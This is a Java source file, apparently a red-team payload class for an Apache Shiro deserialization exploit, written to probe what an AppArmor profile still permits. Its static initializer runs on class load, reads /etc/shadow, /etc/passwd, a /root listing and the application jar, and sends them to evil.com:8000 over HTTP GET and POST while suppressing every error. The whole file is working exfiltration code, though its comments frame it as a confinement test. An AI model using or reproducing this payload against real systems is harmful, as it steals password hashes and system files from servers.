import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/**
 * RT5 Shiro weapon: bulk secret exfil via the profile's residual inet permission.
 * aa-shiro grants: /etc/** r, /root/** rm, /shirodemo-1.0-SNAPSHOT.jar rm,
 * network inet stream. No exec beyond java. Single class, no inner classes.
 */
public class PwnExfil extends AbstractTranslet {

    static void post(String path, byte[] body) {
        try {
            java.net.URL u = new java.net.URL("http://evil.com:8000" + path);
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.getOutputStream().write(body);
            c.getResponseCode();
        } catch (Throwable t) {
            // silent
        }
    }

    static byte[] slurp(String p) {
        try {
            java.io.InputStream in = new java.io.FileInputStream(p);
            java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) {
                bos.write(buf, 0, n);
            }
            in.close();
            return bos.toByteArray();
        } catch (Throwable t) {
            return ("ERR " + t).getBytes();
        }
    }

    static {
        // a) /etc/shadow + /etc/passwd (explicit /etc/** r grant) -- GET w/ base64 in URL
        // so the infra access log itself is content-level ground truth
        try {
            String d = java.util.Base64.getEncoder().encodeToString(
                slurp("/etc/shadow"));
            new java.net.URL("http://evil.com:8000/rt5/shiro_shadow_get?d=" + d)
                .getContent();
        } catch (Throwable t) {
            // silent
        }
        post("/rt5/shiro_shadow", slurp("/etc/shadow"));
        post("/rt5/shiro_passwd", slurp("/etc/passwd"));
        // b) /root listing (rm grant on /root/**)
        StringBuilder sb = new StringBuilder();
        try {
            java.io.File[] fs = new java.io.File("/root").listFiles();
            if (fs != null) {
                for (int i = 0; i < fs.length; i++) {
                    sb.append(fs[i].isDirectory() ? "d " : "f ")
                      .append(fs[i].length()).append(' ')
                      .append(fs[i].getName()).append('\n');
                }
            }
        } catch (Throwable t) {
            sb.append("ERR ").append(t);
        }
        post("/rt5/shiro_root", sb.toString().getBytes());
        // c) the 22MB application jar: full read + CRC (proves whole-file access)
        try {
            java.util.zip.CRC32 crc = new java.util.zip.CRC32();
            java.io.InputStream in = new java.io.FileInputStream(
                "/shirodemo-1.0-SNAPSHOT.jar");
            byte[] buf = new byte[65536];
            long total = 0;
            int n;
            while ((n = in.read(buf)) > 0) {
                crc.update(buf, 0, n);
                total += n;
            }
            in.close();
            post("/rt5/shiro_jar",
                 ("len=" + total + " crc32=" + Long.toHexString(crc.getValue()))
                     .getBytes());
        } catch (Throwable t) {
            post("/rt5/shiro_jar", ("ERR " + t).getBytes());
        }
        // d) allowed-path control write (/run/aa-tmp/shiro/** rwkm)
        try {
            java.io.FileOutputStream f = new java.io.FileOutputStream(
                "/run/aa-tmp/shiro/rt5_allowed_marker");
            f.write("rt5".getBytes());
            f.close();
        } catch (Throwable t) {
            // silent
        }
        // e) /tmp control (expect kernel DENY)
        try {
            java.io.FileOutputStream f = new java.io.FileOutputStream(
                "/tmp/rt5_shiro_tmp");
            f.write(120);
            f.close();
        } catch (Throwable t) {
            // silent
        }
    }

    public PwnExfil() {
    }

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {
    }

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {
    }
}
